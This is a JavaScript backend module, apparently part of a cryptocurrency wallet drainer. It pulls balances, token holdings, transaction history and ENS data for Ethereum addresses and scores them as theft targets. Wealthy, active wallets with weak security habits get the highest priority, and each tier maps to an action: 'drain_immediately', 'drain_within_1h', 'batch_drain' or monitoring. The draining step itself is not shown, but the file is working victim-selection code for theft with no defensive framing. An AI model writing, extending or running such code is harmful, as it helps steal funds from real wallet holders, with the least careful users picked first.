// modules/aiScanner.js - BACKEND VERSION
import { ethers } from 'ethers';
import axios from 'axios';

const TARGET_PARAMS = {
  MIN_VALUE: 0.5, // ETH
  RISK_TOLERANCE: 4,
  HIGH_VALUE_THRESHOLD: 5, // ETH
  WHALE_THRESHOLD: 25, // ETH
  MIN_PROFITABILITY: 100 // USD - Minimum estimated profit to target
};

// Advanced scoring weights
const SCORE_WEIGHTS = {
  PORTFOLIO_VALUE: 0.35,
  ACTIVITY_LEVEL: 0.25,
  SECURITY_PROFILE: 0.20,
  BEHAVIORAL_PATTERNS: 0.20
};

// Target Priority Matrix
export const TARGET_PRIORITY = {
    IMMEDIATE: {
        minScore: 85,
        conditions: ['highValue', 'lowSecurity', 'activeTrader', 'noDefiHistory'],
        action: 'drain_immediately',
        timeout: 0
    },
    HIGH: {
        minScore: 70,
        conditions: ['mediumValue', 'moderateSecurity', 'someActivity'],
        action: 'drain_within_1h',
        timeout: 3600000 // 1 hour
    },
    MEDIUM: {
        minScore: 50,
        conditions: ['lowValue', 'anySecurity', 'lowActivity'],
        action: 'batch_drain',
        timeout: 86400000 // 24 hours
    },
    LOW: {
        minScore: 0,
        conditions: ['minimalValue', 'highSecurity'],
        action: 'monitor_only',
        timeout: 604800000 // 1 week
    }
};

export class AIScanner {
    constructor() {
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Add any module-specific initialization here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async analyzeWallet(address, provider) {
      try {
        const [balance, chainId] = await Promise.all([
          provider.getBalance(address),
          provider.getNetwork().then(network => network.chainId)
        ]);
    
        // Get comprehensive data
        const [tokens, transactionHistory, ensData] = await Promise.all([
          this.fetchTokenData(address, chainId),
          this.fetchTransactionHistory(address, chainId),
          this.fetchENSData(address, provider)
        ]);
    
        // Advanced risk scoring
        const riskScore = this.calculateAdvancedRisk(tokens, balance, transactionHistory, ensData);
        const highValueAssets = tokens.filter(t => 
          (t.quote_rate || 0) * (t.balance / 10 ** t.contract_decimals) >= TARGET_PARAMS.MIN_VALUE
        );
    
        // Advanced analysis
        const advancedAnalysis = await this.calculateAdvancedScore(
          address, 
          tokens, 
          balance, 
          transactionHistory, 
          ensData,
          provider
        );
    
        return {
          riskScore,
          highValueAssets,
          chainId,
          isPrimeTarget: riskScore <= TARGET_PARAMS.RISK_TOLERANCE && 
                        highValueAssets.length > 0 &&
                        advancedAnalysis.profitabilityEstimate >= TARGET_PARAMS.MIN_PROFITABILITY,
          advancedScore: advancedAnalysis.score,
          priorityLevel: advancedAnalysis.priorityLevel,
          recommendedAction: advancedAnalysis.recommendedAction,
          profitabilityEstimate: advancedAnalysis.profitabilityEstimate,
          securityProfile: advancedAnalysis.securityProfile,
          lastActivity: advancedAnalysis.lastActivity
        };
      } catch (error) {
        console.error('AI Scanner error:', error);
        // Fallback to basic analysis
        return await this.basicAnalysis(address, provider);
      }
    }
    
    // Enhanced risk calculation
    calculateAdvancedRisk(tokens, balance, transactionHistory, ensData) {
      let risk = 3;
      
      // Portfolio-based risks
      const ethBalance = parseFloat(ethers.formatEther(balance));
      if (ethBalance > TARGET_PARAMS.WHALE_THRESHOLD) risk -= 2;
      else if (ethBalance > TARGET_PARAMS.HIGH_VALUE_THRESHOLD) risk -= 1;
      
      // Security awareness risks
      if (ensData.hasENS) risk += 2; // More careful users
      if (ensData.primaryENS) risk += 1;
      
      // Activity pattern risks
      if (transactionHistory.totalTxs > 1000) risk += 1; // Experienced users
      if (transactionHistory.defiInteractions > 50) risk += 2;
      
      // Privacy tool usage
      if (tokens.some(t => t.contract_name?.match(/tornado|mixer|blender|privacy/i))) risk += 3;
      
      return Math.min(Math.max(risk, 1), 10);
    }
    
    // Advanced scoring system
    async calculateAdvancedScore(address, tokens, balance, txHistory, ensData, provider) {
      let score = 0;
      
      // 1. Portfolio Value (35%)
      const portfolioValue = await this.calculatePortfolioValue(tokens, balance);
      score += portfolioValue.score * SCORE_WEIGHTS.PORTFOLIO_VALUE;
      
      // 2. Activity Level (25%)
      const activityScore = this.analyzeActivityPatterns(txHistory);
      score += activityScore * SCORE_WEIGHTS.ACTIVITY_LEVEL;
      
      // 3. Security Profile (20%)
      const securityScore = this.assessSecurityMeasures(ensData, txHistory, tokens);
      score += securityScore * SCORE_WEIGHTS.SECURITY_PROFILE;
      
      // 4. Behavioral Patterns (20%)
      const behaviorScore = this.analyzeBehavioralPatterns(txHistory, tokens);
      score += behaviorScore * SCORE_WEIGHTS.BEHAVIORAL_PATTERNS;
      
      const finalScore = Math.min(Math.max(Math.round(score), 0), 100);
      
      return {
        score: finalScore,
        priorityLevel: this.getPriorityLevel(finalScore),
        recommendedAction: this.getRecommendedAction(finalScore),
        profitabilityEstimate: portfolioValue.estimatedValue,
        securityProfile: securityScore,
        lastActivity: txHistory.lastTxDate
      };
    }
    
    async calculatePortfolioValue(tokens, balance) {
      const ethBalance = parseFloat(ethers.formatEther(balance));
      const ethPrice = await this.fetchETHPrice();
      let totalValue = ethBalance * ethPrice;
      
      // Add token values
      tokens.forEach(token => {
        const price = token.quote_rate || 0;
        const amount = token.balance / (10 ** token.contract_decimals);
        totalValue += price * amount;
      });
      
      // Score based on value (logarithmic scaling)
      const score = Math.min(Math.log10(totalValue + 1) * 25, 100);
      
      return { score, estimatedValue: totalValue };
    }
    
    async fetchETHPrice() {
      try {
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
        return response.data.ethereum.usd || 2500;
      } catch (error) {
        console.error('ETH price fetch error:', error);
        return 2500;
      }
    }
    
    analyzeActivityPatterns(txHistory) {
      const { totalTxs, defiInteractions, lastTxDate } = txHistory;
      
      let score = 50;
      const daysSinceLastTx = (Date.now() - new Date(lastTxDate).getTime()) / (1000 * 60 * 60 * 24);
      
      if (daysSinceLastTx < 1) score += 20;
      else if (daysSinceLastTx < 7) score += 10;
      
      if (totalTxs > 500) score += 15;
      else if (totalTxs > 100) score += 10;
      
      if (defiInteractions > 100) score += 15;
      else if (defiInteractions > 50) score += 10;
      
      return Math.min(score, 100);
    }
    
    assessSecurityMeasures(ensData, txHistory, tokens) {
      let score = 50;
      
      if (ensData.hasENS) score -= 20;
      if (ensData.primaryENS) score -= 15;
      if (txHistory.hasComplexWallets) score -= 25;
      if (txHistory.hasApprovalRevokes) score -= 15;
      if (txHistory.avgTxsPerDay < 0.5 && txHistory.totalTxs > 10) score -= 10;
      
      const privacyTokens = tokens.filter(t => 
        t.contract_name?.match(/tornado|mixer|monero|zcash|secret|railgun/i)
      );
      if (privacyTokens.length > 0) score -= 10;
      
      return Math.max(score, 0);
    }
    
    analyzeBehavioralPatterns(txHistory, tokens) {
      let score = 60;
      
      if (txHistory.avgTxsPerDay > 10) score += 20;
      
      const farmingTokens = tokens.filter(t => 
        t.contract_name?.match(/farm|yield|staking|pool/i)
      );
      if (farmingTokens.length > 0) score += 15;
      
      const nftCount = tokens.filter(t => t.type === 'nft').length;
      if (nftCount > 10) score += 10;
      
      return Math.min(score, 100);
    }
    
    getPriorityLevel(score) {
      if (score >= 85) return 'IMMEDIATE';
      if (score >= 70) return 'HIGH';
      if (score >= 50) return 'MEDIUM';
      return 'LOW';
    }
    
    getRecommendedAction(score) {
      const level = this.getPriorityLevel(score);
      return TARGET_PRIORITY[level].action;
    }
    
    // Data fetching functions with direct API calls
    async fetchTokenData(address, chainId) {
      try {
        const apiKey = process.env.COVALENT_API_KEY;
        if (!apiKey) return [];
    
        const response = await axios.get(
          `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/`,
          {
            params: { key: apiKey },
            timeout: parseInt(process.env.API_TIMEOUT) || 10000
          }
        );
    
        return response.data.data.items || [];
      } catch (error) {
        console.error('Token data fetch error:', error);
        return [];
      }
    }
    
    async fetchTransactionHistory(address, chainId) {
      try {
        const apiKey = process.env.COVALENT_API_KEY;
        if (!apiKey) return this.getFallbackTxData();
    
        const response = await axios.get(
          `https://api.covalenthq.com/v1/${chainId}/address/${address}/transactions_v2/`,
          {
            params: { key: apiKey, 'page-size': 100 },
            timeout: parseInt(process.env.API_TIMEOUT) || 10000
          }
        );
    
        const txs = response.data.data.items || [];
        return {
          totalTxs: txs.length,
          defiInteractions: txs.filter(tx => tx.log_events?.some(e => e.decoded?.name === 'Swap')).length,
          lastTxDate: txs[0]?.block_signed_at || new Date().toISOString(),
          hasComplexWallets: false,
          hasApprovalRevokes: txs.some(tx => tx.log_events?.some(e => e.decoded?.name === 'Approval')),
          avgTxsPerDay: txs.length / 30 // Rough estimate
        };
      } catch (error) {
        console.error('Transaction history fetch error:', error);
        return this.getFallbackTxData();
      }
    }
    
    getFallbackTxData() {
      return {
        totalTxs: 0,
        defiInteractions: 0,
        lastTxDate: new Date().toISOString(),
        hasComplexWallets: false,
        hasApprovalRevokes: false,
        avgTxsPerDay: 0
      };
    }
    
    async fetchENSData(address, provider) {
      try {
        const ensName = await provider.lookupAddress(address);
        return {
          hasENS: !!ensName,
          primaryENS: ensName,
          reverseRecord: !!ensName
        };
      } catch (error) {
        console.error('ENS data fetch error:', error);
        return {
          hasENS: false,
          primaryENS: null,
          reverseRecord: false
        };
      }
    }
    
    // Fallback basic analysis
    async basicAnalysis(address, provider) {
      const [balance, chainId] = await Promise.all([
        provider.getBalance(address),
        provider.getNetwork().then(network => network.chainId)
      ]);
    
      const tokens = await this.fetchTokenData(address, chainId);
      const riskScore = this.calculateRisk(tokens, balance);
      const highValueAssets = tokens.filter(t => 
        (t.quote_rate || 0) * (t.balance / 10 ** t.contract_decimals) >= TARGET_PARAMS.MIN_VALUE
      );
    
      return {
        riskScore,
        highValueAssets,
        chainId,
        isPrimeTarget: riskScore <= TARGET_PARAMS.RISK_TOLERANCE && highValueAssets.length > 0,
        advancedScore: 50,
        priorityLevel: 'MEDIUM',
        recommendedAction: 'batch_drain',
        profitabilityEstimate: 0,
        securityProfile: 50,
        lastActivity: new Date().toISOString()
      };
    }
    
    // Keep original function for backward compatibility
    calculateRisk(tokens, balance) {
      let risk = 3;
      if (tokens.some(t => t.contract_name?.match(/tornado|mixer|blender/i))) risk += 3;
      if (parseFloat(ethers.formatEther(balance)) > 5) risk -= 1;
      return Math.min(Math.max(risk, 1), 10);
    }
}